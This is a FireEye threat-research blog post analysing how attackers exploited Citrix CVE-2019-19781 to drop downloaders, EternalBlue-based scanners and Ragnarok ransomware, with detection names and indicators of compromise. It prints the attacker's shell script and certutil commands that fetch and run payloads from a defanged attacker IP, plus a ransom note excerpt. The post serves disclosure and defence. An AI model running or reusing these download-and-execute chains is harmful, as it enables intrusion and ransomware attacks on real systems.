@@ -1,0 +1,523 @@
+Report an Incident
+
+Contact Us
+
+-   Contact Us
+-   Chat with an Expert
+-   Report an Incident
+
+Search
+
+Search FireEye.com
+
+Go
+
+[FireEye]
+
+-   Solutions
+
+    Enterprise Security
+
+    -   Helix Security Platform
+    -   Verodin Security Instrumentation
+    -   Network Security and Forensics
+    -   Endpoint Security
+    -   Email Security
+    -   Detection On Demand
+
+    FireEye Expertise
+
+    -   Expertise On Demand
+    -   Managed Defense
+    -   Threat Intelligence
+
+    Security For:
+
+    -   Cloud
+    -   Financial Services
+    -   Government
+    -   Healthcare
+    -   Industrial Control Systems
+
+    VIEW ALL SOLUTIONS
+
+-   Services
+
+    Assess
+
+    -   Compromise Assessment
+    -   Cloud Assessments
+    -   Red Team Assessment
+    -   Purple Team Assessments
+    -   Security Program Assessment
+    -   Response Readiness Assessment
+    -   Tabletop Exercise
+    -   Penetration Testing
+
+    Transform
+
+    -   Cyber Defense Center Development
+    -   Deployment and Integration Services
+    -   Cyber Defense Operations
+
+    Defend
+
+    -   Managed Defense
+
+    Respond
+
+    -   Incident Response Services
+    -   Incident Response Retainer
+
+    Train
+
+    -   Product, Intelligence and Expertise Training
+    -   ThreatSpace Cyber Simulation Exercise
+
+    VIEW ALL SERVICES
+
+-   Customers
+
+    Customers
+
+    -   Customer Stories
+    -   Customer Success
+    -   Customer Portal
+
+    Get Support
+
+    -   Contact Support
+
+    Find Answers
+
+    -   Support Programs
+    -   Support Notices
+    -   Supported Products
+    -   Communities
+    -   Documentation Portal
+
+    Support
+
+    A global network of support experts available 24x7. We offer simple and flexible support programs to maximize the value of your FireEye products and services.
+
+    Support
+
+-   Partners
+
+    FireEye Partners
+
+    -   Partners Overview
+    -   FireEye Affinity Resellers
+    -   Technology Partners
+    -   Cyber Risk Partners
+    -   Global Service Providers
+
+    Partner Resources
+
+    -   Partner Locator
+    -   Partner Education Center
+    -   Support
+
+    Partnering with FireEye
+
+    -   Become a Partner
+
+    Partner Portal
+
+    Access for our registered Partners to help you be successful with FireEye. Collateral, deal registration, request for funds, training, enablement, and more.
+
+    Partner Portal
+
+-   Resources
+
+    Intelligence Briefing and Bulletins
+
+    -   Annual Threat Reports
+    -   Threat Intelligence Reports
+    -   Threat Intelligence Reports by Industry
+    -   Advanced Persistent Threat Groups
+
+    FireEye Blogs
+
+    -   Read the FireEye Blogs
+
+    Cyber Security
+
+    -   What is Cyber Security?
+    -   One Security Platform
+    -   No. 1 Attack Vector – Email
+    -   One Trusted Advisor for Expertise
+    -   The Vision – Digital Magazine
+
+    Free Tools & Apps
+
+    -   Free Software Downloads
+    -   FireEye Market
+
+    Training
+
+    -   Education and Training
+
+    VIEW ALL RESOURCES
+
+-   Company
+
+    About Us
+
+    -   Why FireEye?
+    -   Awards and Honors
+    -   Leadership
+    -   Board of Directors
+    -   Investor Relations
+
+    News and Events
+
+    -   Newsroom
+    -   Press Releases
+    -   Webinars
+    -   Events
+
+    Careers
+
+    -   Job Opportunities
+    -   Internships
+
+    Contact
+
+    -   Contact FireEye
+
+To give you the best possible experience, this site uses cookies.  Find out more on how we use cookies.
+
+Accept
+
+-   Home
+-   FireEye Blogs
+-   Threat Research
+-   Nice Try: 501 (Ransomware) Not Implemented
+
+Threat Research {.category-name}
+---------------
+
+Nice Try: 501 (Ransomware) Not Implemented {.blogpostlanding .red itemprop="headline"}
+==========================================
+
+January 24, 2020 | by Matt Bromiley, Christopher Glyer, Andrew Thompson
+
+Ransomware  
+ Exploit  
+ Vulnerability  
+
+An Ever-Evolving Threat
+
+Since January 10, 2020, FireEye has tracked extensive global exploitation of CVE-2019-19781, which continues to impact Citrix ADC and Gateway instances that are unpatched or do not have mitigations applied. We previously reported on attackers’ swift attempts to exploit this vulnerability and the post-compromise deployment of the previously unseen NOTROBIN malware family by one threat actor. FireEye continues to actively track multiple clusters of activity associated with exploitation of this vulnerability, primarily based on how attackers interact with vulnerable Citrix ADC and Gateway instances after identification.
+
+While most of the CVE-2019-19781 exploitation activity we’ve observed to this point has led to the deployment of coin miners or most commonly NOTROBIN, recent compromises suggest that this vulnerability is also being exploited to deploy ransomware. If your organization is attempting to assess whether there is evidence of compromise related to exploitation of CVE-2019-19781, we highly encourage you to use the IOC Scanner co-published by FireEye and Citrix, which detects the activity described in this post.
+
+Between January 16 and 17, 2020, FireEye Managed Defense detected the IP address 45[.]120[.]53[.]214 attempting to exploit CVE-2019-19781 at dozens of FireEye clients. When successfully exploited, we observed impacted systems executing the cURL command to download a shell script with the file name ld.sh from 45[.]120[.]53[.]214 (Figure 1). In some cases this same shell script was instead downloaded from hxxp://198.44.227[.]126:81/citrix/ld.sh.
+
+[]  
+ Figure 1: Snippet of ld.sh, downloaded from 45.120.53.214
+
+The shell script, provided in Figure 2, searches for the python2 binary (Note: Python is only pre-installed on Citrix Gateway 12.x and 13.x systems) and downloads two additional files to the system: piz.Lan, a XOR-encoded data blob, and de.py, a Python script, to a temporary directory. This script then changes permissions and executes de.py, which subsequently decodes and decompresses piz.Lan. Finally, the script cleans up the initial staging files and executes scan.py, an additional script we will cover in more detail later in the post.
+
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ #!/bin/sh                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+  rm $0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+  if [ ! -f "/var/python/bin/python2" ]; then                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+  echo 'Exit'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+  exit                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+  fi                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ mkdir /tmp/rAgn                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+  cd /tmp/rAgn                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ curl hxxp://45[.]120[.]53[.]214/piz.Lan -o piz.Lan                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+  sleep 1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+  curl hxxp://45[.]120[.]53[.]214/de -o de.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+  chmod 777 de.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+  /var/python/bin/python2 de.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ rm de.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+  rm piz.Lan                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+  rm .new.zip                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+  cd httpd                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+  /var/python/bin/python2 scan.py -n 50 -N 40 &                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Figure 2: Contents of ld.sh, a shell-script to download additional tools to the compromised system
+
+piz.Lan -> .net.zip
+
+Armed with the information gathered from de.py, we turned our attention to decoding and decompressing “.net.zip” (MD5: 0caf9be8fd7ba5b605b7a7b315ef17a0). Inside, we recovered five files, represented in Table 1:
+
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Filename                                                                                                                                                                   | Functionality                                                                                                                                                              | MD5                                                                                                                                                                        
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ x86.dll                                                                                                                                                                    | 32-bit Downloader                                                                                                                                                          | 9aa67d856e584b4eefc4791d2634476a                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ x64.dll                                                                                                                                                                    | 64-bit Downloader                                                                                                                                                          | 55b40e0068429fbbb16f2113d6842ed2                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ scan.py                                                                                                                                                                    | Python socket scanner                                                                                                                                                      | b0acb27273563a5a2a5f71165606808c                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ xp_eternalblue.replay                                                                                                                                                      | Exploit replay file                                                                                                                                                        | 6cf1857e569432fcfc8e506c8b0db635                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ eternalblue.replay                                                                                                                                                         | Exploit replay file                                                                                                                                                        | 9e408d947ceba27259e2a9a5c71a75a8                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Table 1: Contents of the ZIP file ".new.zip", created by the script de.py
+
+The contents of the ZIP were explained via analysis of the file scan.py, a Python scanning script that would also automate exploitation of identified vulnerable system(s). Our initial analysis showed that this script was a combination of functions from multiple open source projects or scripts. As one example, the replay files, which were either adapted or copied directly from this public GitHub repository, were present in the Install_Backdoor function, as shown in Figure 3:
+
+[]  
+ Figure 3: Snippet of scan.py showing usage of EternalBlue replay files
+
+This script also had multiple functions checking whether an identified system is 32- vs. 64-bit, as well as raw shell code to step through an exploit. The exploit_main function, when called, would appropriately choose between 32- or 64-bit and select the right DLL for injection, as shown in Figure 4.
+
+[]  
+ Figure 4: Snippet of scan.py showing instructions to deploy 32- or 64-bit downloaders
+
+I Call Myself Ragnarok
+
+Our analysis continued by examining the capabilities of the 32- and 64-bit DLLs, aptly named x86.dll and x64.dll. At only 5,120 bytes each, these binaries performed the following tasks (Figure 5 and Figure 6):
+
+1.  Download a file named patch32 or patch64 (respective to operating system bit-ness) from a hard-coded URL using certutil, a native tool used as part of Windows Certificate Services (categorized as Technique 11005 within MITRE’s ATT&CK framework).
+2.  Execute the downloaded binary since1969.exe, located in C:\Users\Public.
+3.  Delete the URL from the current user’s certificate cache.
+
+  -------------------------------------------------------------------------------------------------
+  certutil.exe -urlcache -split -f hxxp://45.120.53[.]214/patch32 C:/Users/Public/since1969.exe  
+   cmd.exe /c C:/Users/Public/since1969.exe  
+   certutil -urlcache -f hxxp://45.120.53[.]214/patch32 delete
+  -------------------------------------------------------------------------------------------------
+
+Figure 5: Snippet of strings from x86.dll
+
+  -------------------------------------------------------------------------------------------------
+  certutil.exe -urlcache -split -f hxxp://45.120.53[.]214/patch64 C:/Users/Public/since1969.exe  
+   cmd.exe /c C:/Users/Public/since1969.exe  
+   certutil -urlcache -f hxxp://45.120.53[.]214/patch64 delete
+  -------------------------------------------------------------------------------------------------
+
+Figure 6: Snippet of strings from x64.dll
+
+Although neither patch32 nor patch64 were available at the time of analysis, FireEye identified a file on VirusTotal with the name avpass.exe (MD5: e345c861058a18510e7c4bb616e3fd9f) linked to the IP address 45[.]120[.]53[.]214 (Figure 8). This file is an instance of the publicly available Meterpreter backdoor that was uploaded on November 12, 2019. Additional analysis confirmed that this binary communicated to 45[.]120[.]53[.]214 over TCP port 1234.
+
+[]  
+ Figure 7: VirusTotal graph showing links between resources hosted on or communicating with 45.120.53.214
+
+Within the avpass.exe binary, we found an interesting PDB string that provided more context about the tool’s author: “C:\Users\ragnarok\source\repos\avpass\Debug\avpass.pdb”. Utilizing ragnarok as a keyword, we pivoted and were able to identify a separate copy of since1969.exe (MD5: 48452dd2506831d0b340e45b08799623) uploaded to VirusTotal on January 23, 2020. The binary’s compilation timestamp of January 16, 2020, aligns with our earliest detections associated with this threat actor.
+
+Further analysis and sandboxing of this binary brought all the pieces together—this threat actor may have been attempting to deploy ransomware aptly named ‘Ragnarok’. We’d like to give credit to this Tweet from Karsten Hahn, who identified ragnarok-related about artifacts on January 17, 2020, again aligning with the timeframe of our initial detection. Figure 8 provides a snippet of files created by the binary upon execution.
+
+[]  
+ Figure 8: Ragnarok-related ransomware files
+
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ The ransom note dropped by this ransomware, shown in Figure 11, points to three email addresses.                                                                                                                                                                                                                                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ 6.it's wise to pay as soon as possible it wont make you more losses                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ the ransome: 1 btcoin for per machine,5 bitcoins for all machines                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ how to buy bitcoin and transfer? i think you are very good at googlesearch                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ asgardmaster5@protonmail[.]com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+  ragnar0k@ctemplar[.]com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+  j.jasonm@yandex[.]com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+ Attention:if you wont pay the ransom in five days, all of your files will be made public on internet and will be deleted                                                                                                                                                                                                                                                                                                                                                                                                         
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Figure 9: Snippet of ransom note dropped by “since1969.exe”
+
+Implications
+
+FireEye continues to observe multiple actors who are currently seeking to take advantage of CVE-2019-19781. This post outlines one threat actor who is using multiple exploits to take advantage of vulnerable internal systems and move laterally inside the organization. Based on our initial observations, the ultimate intent may have been the deployment of ransomware, using the Gateway as a central pivot point.
+
+As previously mentioned, if suspect your Citrix appliances may have been compromised, we recommend utilizing the tool FireEye released in partnership with Citrix.
+
+Detect the Technique
+
+Aside from CVE-2019-19781, FireEye detects the activity described in this post across our platforms, including named detections for Meterpreter, and EternalBlue. Table 2 contains several specific detection names to assist in detection of this activity.
+
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Signature Name                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ CERTUTIL.EXE DOWNLOADER (UTILITY)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ CURL Downloading Shell Script                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ ETERNALBLUE EXPLOIT                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ METERPRETER (Backdoor)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ METERPRETER URI (STAGER)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ SMB - ETERNALBLUE                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Table 2: FireEye Detections for activity described in this post
+
+Indicators
+
+Table 3 provides the unique indicators discussed in this post.
+
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Indicator Type                                                                                                                                                             | Indicator                                                                                                                                                                  | Notes                                                                                                                                                                      
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Network                                                                                                                                                                    | 45[.]120[.]53[.]214                                                                                                                                                        |                                                                                                                                                                            
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Network                                                                                                                                                                    | 198[.]44[.]227[.]126                                                                                                                                                       |                                                                                                                                                                            
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 91dd06f49b09a2242d4085703599b7a7                                                                                                                                           | piz.Lan                                                                                                                                                                    
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 01af5ad23a282d0fd40597c1024307ca                                                                                                                                           | de.py                                                                                                                                                                      
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | bd977d9d2b68dd9b12a3878edd192319                                                                                                                                           | ld.sh                                                                                                                                                                      
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 0caf9be8fd7ba5b605b7a7b315ef17a0                                                                                                                                           | .new.zip                                                                                                                                                                   
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 9aa67d856e584b4eefc4791d2634476a                                                                                                                                           | x86.dll                                                                                                                                                                    
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 55b40e0068429fbbb16f2113d6842ed2                                                                                                                                           | x64.dll                                                                                                                                                                    
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | b0acb27273563a5a2a5f71165606808c                                                                                                                                           | scan.py                                                                                                                                                                    
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 6cf1857e569432fcfc8e506c8b0db635                                                                                                                                           | xp_eternalblue.replay                                                                                                                                                      
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 9e408d947ceba27259e2a9a5c71a75a8                                                                                                                                           | eternalblue.replay                                                                                                                                                         
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | e345c861058a18510e7c4bb616e3fd9f                                                                                                                                           | avpass.exe                                                                                                                                                                 
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Host                                                                                                                                                                       | 48452dd2506831d0b340e45b08799623                                                                                                                                           | since1969.exe                                                                                                                                                              
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Email Address                                                                                                                                                              | asgardmaster5@protonmail[.]com                                                                                                                                             | From ransom note                                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Email Address                                                                                                                                                              | ragnar0k@ctemplar[.]com                                                                                                                                                    | From ransom note                                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+ Email Address                                                                                                                                                              | j.jasonm@yandex[.]com                                                                                                                                                      | From ransom note                                                                                                                                                           
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Table 3: Collection of IOCs from this blog post
+
+Previous Post
+
+Next Post
+
+Promotion
+
+Subscribe
+
+Share
+
+Recent
+
+RSS
+
+[blog-cta-mtrends-2020]
+
+Email Updates
+
+Information and insight on today's advanced threats from FireEye.
+
+Share
+
+Recent Posts
+
+-   20 Feb 2020
+
+    M-Trends 2020: Insights From the Front Lines
+
+-   19 Feb 2020
+
+    The Missing LNK — Correlating User Search LNK files
+
+-   12 Feb 2020
+
+    "Distinguished Impersonator" Information Operation That Previously Impersonated U.S. Politicians and Journalists on Social Media Leverages Fabricated U.S. Liberal Personas to Promote Iranian Interests
+
+RSS Feed: Stay Connected
+
+Company
+
+-   Why FireEye?
+-   Customer Stories
+-   Careers
+-   Certifications and Compliance
+-   Investor Relations
+-   Supplier Documents
+
+News and Events
+
+-   Newsroom
+-   Press Releases
+-   Webinars
+-   Events
+-   Awards and Honors
+-   Email Preferences
+
+Technical Support
+
+-   Incident?
+-   Report Security Issue
+-   Contact Support
+-   Customer Portal
+-   Communities
+-   Documentation Portal
+
+FireEye Blogs
+
+-   Threat Research
+-   FireEye Stories
+-   Industry Perspectives
+
+Threat Map
+
+-   View the Latest Threats
+
+Contact Us  
+
+-   +1 877-347-3393  
+     
+
+Stay Connected
+
+-   LinkedIn
+-   Twitter
+-   Facebook
+-   YouTube
+-   Podcast
+
+Cette page est également disponible en français.
+
+Version française
+
+Diese Seite ist auch auf Deutsch verfügbar
+
+Zur deutschen Seite wechseln
+
+日本語ページを
+
+見る
+
+해당 페이지는 한글 버전으로 보실 수 있습니다
+
+바로 가기
+
+* * * * *
+
+Continue viewing this page in English
+
+Copyright © 2020 FireEye, Inc. All rights reserved. Privacy & Cookies Policy | Privacy Shield | Legal Documentation
+
+Site Language English
+
+My preferred language:
+
+-   English (English)
+-   French (Français)
+-   German (Deutsch)
+-   Japanese (日本語)
+-   Korean (한국어)
+-   More languages
+
